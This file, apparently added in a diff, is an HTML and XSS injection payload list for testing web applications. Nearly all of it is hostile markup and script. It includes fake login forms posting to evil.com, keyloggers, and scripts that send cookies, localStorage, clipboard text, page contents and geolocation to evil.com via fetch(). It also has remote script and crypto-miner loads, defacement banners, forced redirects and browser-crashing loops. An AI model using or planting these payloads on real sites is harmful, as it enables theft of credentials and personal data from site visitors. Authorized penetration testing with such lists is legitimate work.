@@ -1,0 +1,173 @@
+<!-- Basic HTML Tags -->
+<h1>HTML Injection Test</h1>
+<div style="color:red;">HTML Injection Successful</div>
+<p>This is an HTML injection test</p>
+<span style="font-size:50px;">Hacked</span>
+<marquee>Website Vulnerable</marquee>
+<blink>Security Test</blink>
+<strong>Injection Detected</strong>                        <em>Italic Injection</em>
+<u>Underlined Text</u>
+<strike>Strikethrough Text</strike>
+
+<!-- Links and Redirects -->
+<a href="http://evil.com">Click here</a>
+<a href="javascript:alert('XSS')">Free Gift</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Download</a>
+<meta http-equiv="refresh" content="0;url=http://evil.com">
+<iframe src="http://evil.com" width="100%" height="500"></iframe>
+<embed src="http://evil.com/swf/malicious.swf">
+<object data="http://evil.com/malicious.pdf" width="400" height="300"></object>
+
+<!-- Forms and Inputs -->
+<form action="http://evil.com/steal.php" method="POST">
+  <input type="text" name="username" placeholder="Username">
+  <input type="password" name="password" placeholder="Password">
+  <input type="submit" value="Login">
+</form>
+<input type="button" value="Click me" onclick="alert('Injected')">
+<textarea>Default malicious text</textarea>
+<select><option>Option 1</option><option>Option 2</option></select>
+<button onclick="alert('Pwned')">Click</button>
+
+<!-- Images and Media -->
+<img src="x" onerror="alert('HTML Injection')">
+<img src="http://evil.com/image.jpg" alt="Malicious image">
+<video src="http://evil.com/video.mp4" controls></video>
+<audio src="http://evil.com/audio.mp3" controls></audio>
+<svg onload="alert('SVG Injection')"></svg>
+<canvas id="myCanvas"></canvas>
+
+<!-- CSS Injection -->
+<div style="background-color:red; color:white;">CSS Injection</div>
+<div style="position:absolute; top:0; left:0; width:100%; height:100%; background:red; z-index:9999;">Fullscreen overlay</div>
+<div style="display:none;">Hidden content</div>
+<style>body { background-color: red !important; }</style>
+<link rel="stylesheet" href="http://evil.com/malicious.css">
+
+<!-- JavaScript Execution -->
+<script>alert('HTML Injection')</script>
+<script src="http://evil.com/malicious.js"></script>
+<div onmouseover="alert('Mouseover')">Hover me</div>
+<body onload="alert('Page loaded')"></body>
+<input onfocus="alert('Focused')" autofocus>
+<iframe onload="alert('IFrame loaded')"></iframe>
+
+<!-- Advanced Techniques -->
+<details open ontoggle="alert('Details opened')">
+  <summary>Click to expand</summary>
+  Malicious content
+</details>
+<dialog open>This is a dialog</dialog>
+<progress value="100" max="100"></progress>
+<meter value="0.8">80%</meter>
+<template id="myTemplate"><div>Template content</div></template>
+
+<!-- Data URLs -->
+<iframe src="data:text/html,<script>alert('Data URL')</script>"></iframe>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnQmFzZTY0Jyk8L3NjcmlwdD4=">Data URL</a>
+<object data="data:text/html,<h1>Data Object</h1>"></object>
+
+<!-- Form Hijacking -->
+<form id="loginForm" action="http://evil.com/log.php" method="POST">
+  <input type="hidden" name="original_url" value="[ORIGINAL_URL]">
+  <input type="text" name="username" placeholder="Username">
+  <input type="password" name="password" placeholder="Password">
+  <input type="submit" value="Login">
+</form>
+<script>document.getElementById('loginForm').action = 'http://evil.com/steal.php';</script>
+
+<!-- Overlay Attacks -->
+<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:transparent; z-index:9999;" onclick="alert('Clicked')"></div>
+<div style="opacity:0.5; background:black; position:absolute; top:0; left:0; width:100%; height:100%; z-index:9998;"></div>
+
+<!-- Key Logging -->
+<input type="text" onkeypress="fetch('http://evil.com/log?key=' + event.key)">
+<textarea oninput="fetch('http://evil.com/log?text=' + encodeURIComponent(this.value))"></textarea>
+
+<!-- Cookie Theft -->
+<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
+<img src="x" onerror="fetch('http://evil.com/steal?cookie=' + document.cookie)">
+
+<!-- Local Storage Access -->
+<script>fetch('http://evil.com/steal?storage=' + JSON.stringify(localStorage))</script>
+
+<!-- Session Hijacking -->
+<script>setInterval(function(){ fetch('http://evil.com/hijack?html=' + encodeURIComponent(document.documentElement.innerHTML)) }, 5000);</script>
+
+<!-- Phishing -->
+<div style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:20px; border:1px solid black; z-index:10000;">
+  <h2>Security Alert</h2>
+  <p>Please re-enter your credentials to continue</p>
+  <form action="http://evil.com/steal.php">
+    <input type="text" placeholder="Username"><br>
+    <input type="password" placeholder="Password"><br>
+    <input type="submit" value="Login">
+  </form>
+</div>
+
+<!-- Defacement -->
+<div style="position:fixed; top:0; left:0; width:100%; background:red; color:white; text-align:center; padding:10px; z-index:10000;">
+  <h1>THIS SITE HAS BEEN HACKED</h1>
+  <p>By Security Researcher</p>
+</div>
+
+<!-- Redirects -->
+<script>setTimeout(function(){ window.location.href = 'http://evil.com' }, 3000);</script>
+<meta http-equiv="refresh" content="3;url=http://evil.com">
+
+<!-- Browser Fingerprinting -->
+<script>fetch('http://evil.com/fingerprint?userAgent=' + navigator.userAgent + '&platform=' + navigator.platform)</script>
+
+<!-- Crypto Mining -->
+<script src="http://evil.com/crypto-miner.js"></script>
+
+<!-- Fake Comments -->
+<div class="comment">
+  <h4>John Doe</h4>
+  <p>This is a fake comment injected via HTML injection</p>
+  <span>Posted just now</span>
+</div>
+
+<!-- Social Engineering -->
+<div style="border:2px solid gold; background:#fff9e6; padding:15px; margin:10px 0;">
+  <h3 style="color:gold; margin:0;">🎉 Congratulations!</h3>
+  <p>You've won a $1000 gift card! Click <a href="http://evil.com/claim">here</a> to claim your prize.</p>
+</div>
+
+<!-- Hidden Content -->
+<!-- Invisible iframe -->
+<iframe src="http://evil.com" style="width:0;height:0;border:0;border:none;"></iframe>
+
+<!-- Audio Alert -->
+<audio autoplay><source src="http://evil.com/alert.mp3" type="audio/mpeg"></audio>
+
+<!-- Video Background -->
+<video autoplay muted loop style="position:fixed; top:0; left:0; min-width:100%; min-height:100%; z-index:-1;">
+  <source src="http://evil.com/background.mp4" type="video/mp4">
+</video>
+
+<!-- Infinite Loop -->
+<script>while(true) { alert('Infinite loop!'); }</script>
+
+<!-- Browser Crash -->
+<script>for(;;) { window.open('about:blank'); }</script>
+
+<!-- CSS Only Injection -->
+<div style="content:url('http://evil.com/image.jpg')"></div>
+
+<!-- HTML5 Features -->
+<video controls onplay="alert('Video playing')">
+  <source src="http://evil.com/video.mp4" type="video/mp4">
+</video>
+
+<!-- Geolocation -->
+<script>navigator.geolocation.getCurrentPosition(function(p){ fetch('http://evil.com/location?lat='+p.coords.latitude+'&lon='+p.coords.longitude) });</script>
+
+<!-- Webcam Access -->
+<script>navigator.mediaDevices.getUserMedia({video:true}).then(function(s){ fetch('http://evil.com/webcam?status=success') }).catch(function(e){ fetch('http://evil.com/webcam?status=failed') });</script>
+
+<!-- Clipboard Theft -->
+<script>navigator.clipboard.readText().then(function(text){ fetch('http://evil.com/clipboard?text='+encodeURIComponent(text)) });</script>
+
+<!-- Notification Spam -->
+<script>Notification.requestPermission().then(function(p){ if(p==='granted'){ for(let i=0;i<10;i++){ new Notification('SPAM '+i,{body:'This is spam notification '+i}) } } });</script>
